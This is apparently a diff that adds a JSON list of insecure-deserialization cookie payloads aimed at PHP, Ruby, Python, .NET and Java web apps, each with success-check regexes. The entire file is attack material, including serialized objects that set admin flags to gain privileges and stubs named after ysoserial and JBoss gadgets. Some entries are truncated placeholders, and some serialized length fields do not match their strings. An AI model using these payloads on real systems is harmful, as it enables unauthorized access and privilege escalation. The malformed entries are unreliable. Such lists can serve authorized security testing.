@@ -1,0 +1,167 @@
+[
+  {
+    "payload_id": "OWP-0664",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "PHP",
+    "injection_point": "cookie",
+    "payload_string": "O:12:\"AdminService\":0:{}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin"
+    }
+  },
+  {
+    "payload_id": "OWP-0665",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "PHP",
+    "injection_point": "cookie",
+    "payload_string": "a:2:{s:4:\"user\";s:5:\"admin\";s:5:\"admin\";b:1;}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin"
+    }
+  },
+  {
+    "payload_id": "OWP-0666",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "PHP",
+    "injection_point": "cookie",
+    "payload_string": "O:9:\"SimpleXMLElement\":2:{s:1:\"a\";s:1:\"b\";}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0667",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "PHP",
+    "injection_point": "cookie",
+    "payload_string": "O:8:\"PDO\":0:{}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0679",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Ruby",
+    "injection_point": "cookie",
+    "payload_string": "BAhJIhtGYWtlIFNlc3Npb24gS2V5BjoGRVQ=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0680",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Ruby",
+    "injection_point": "cookie",
+    "payload_string": "BAhJIhhhZG1pbi10cnVlCgY6BkVU",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1481",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "PHP",
+    "injection_point": "cookie",
+    "payload_string": "O:10:\"ExampleClass\":0:{}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1482",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "PHP",
+    "injection_point": "cookie",
+    "payload_string": "a:3:{s:4:\"user\";s:5:\"admin\";s:8:\"is_admin\";b:1;s:3:\"uid\";i:1;}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1483",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "PHP",
+    "injection_point": "cookie",
+    "payload_string": "O:7:\"FileLog\":1:{s:4:\"file\";s:8:\"log.txt\";}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1491",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Python",
+    "injection_point": "cookie",
+    "payload_string": "KGRwMApTJ2FkbWluJwpwMQpJMDEKcy4= (pickle cookie)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1495",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": ".NET",
+    "injection_point": "cookie",
+    "payload_string": ".ASPXAUTH=.... (Forms auth ticket deser)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1498",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Ruby",
+    "injection_point": "cookie",
+    "payload_string": "BAhJIhVhZG1pbiBzZXNzaW9uBjoGRVQ= (Marshal cookie)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1499",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Ruby",
+    "injection_point": "cookie",
+    "payload_string": "BAhJIg5hZG1pbgY6BkVU",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1503",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Java",
+    "injection_point": "cookie",
+    "payload_string": "o=.... (JBoss serialized cookie)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1504",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Java",
+    "injection_point": "cookie",
+    "payload_string": "Hax!rO0AB.... (ysoserial payload)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
